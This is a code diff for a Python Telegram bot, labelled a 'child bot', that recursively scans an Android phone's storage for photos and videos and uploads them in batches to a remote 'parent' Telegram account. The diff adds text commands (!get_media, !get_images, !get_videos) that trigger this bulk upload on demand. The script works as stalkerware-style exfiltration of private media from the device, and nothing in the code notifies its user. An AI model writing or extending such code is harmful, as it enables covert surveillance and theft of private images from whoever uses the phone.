@@ -9,7 +9,7 @@ with open(CONFIG_PATH, "r") as f:
     config = json.load(f)
 
 BOT_TOKEN = config["BOT_TOKEN"]
-CHAT_ID = config["CHAT_ID"]
+CHAT_ID = config["CHAT_ID"]  # parent Telegram ID
 
 # File extensions
 IMAGE_EXTS = (".jpg", ".jpeg", ".png", ".heic", ".webp")
@@ -21,7 +21,6 @@ def list_all_media(exts=MEDIA_EXTS):
     """Scan storage recursively for files matching given extensions."""
     files = []
     storage_root = "/storage/emulated/0"
-
     for root, dirs, filenames in os.walk(storage_root):
         for fn in filenames:
             if fn.lower().endswith(exts):
@@ -31,7 +30,6 @@ def list_all_media(exts=MEDIA_EXTS):
                 except:
                     mtime = 0
                 files.append((mtime, path))
-
     files.sort(reverse=True)
     return [p for _, p in files]
 
@@ -39,19 +37,16 @@ async def send_files_in_batches(client, files, batch_size=10):
     if not files:
         await client.send_message(CHAT_ID, "No files found.")
         return
-
     await client.send_message(CHAT_ID, f"Sending {len(files)} files in batches of {batch_size}...")
-
     for i in range(0, len(files), batch_size):
         batch = files[i:i+batch_size]
-
         # Telegram allows max 10 files per album
         for j in range(0, len(batch), 10):
             album = batch[j:j+10]
             if album:
                 try:
                     await client.send_file(CHAT_ID, album)
-                    await asyncio.sleep(1)  # small delay between albums
+                    await asyncio.sleep(1)
                 except Exception as e:
                     print(f"Failed to send album starting with {album[0]}: {e}")
 
@@ -86,13 +81,13 @@ async def main():
         ]
     )
 
+    # Handle parent button presses
     @client.on(events.CallbackQuery)
     async def callback(event):
         if event.sender_id != CHAT_ID:
             return
-
         if event.data == b"get_media":
-            await event.answer("Sending all images and videos in batches...")
+            await event.answer("Sending all media...")
             await send_media(client)
         elif event.data == b"get_images":
             await event.answer("Sending images only...")
@@ -101,7 +96,23 @@ async def main():
             await event.answer("Sending videos only...")
             await send_videos(client)
 
-    print("Child bot is running...")
+    # Handle parent message commands (!get_videos, !get_images, !get_media)
+    @client.on(events.NewMessage)
+    async def on_message(event):
+        if event.sender_id != CHAT_ID:
+            return
+        text = (event.raw_text or "").lower()
+        if text == "!get_videos":
+            await event.respond("Sending videos...")
+            await send_videos(client)
+        elif text == "!get_images":
+            await event.respond("Sending images...")
+            await send_images(client)
+        elif text == "!get_media":
+            await event.respond("Sending all media...")
+            await send_media(client)
+
+    print("Child bot running...")
     await client.run_until_disconnected()
 
 if __name__ == "__main__":
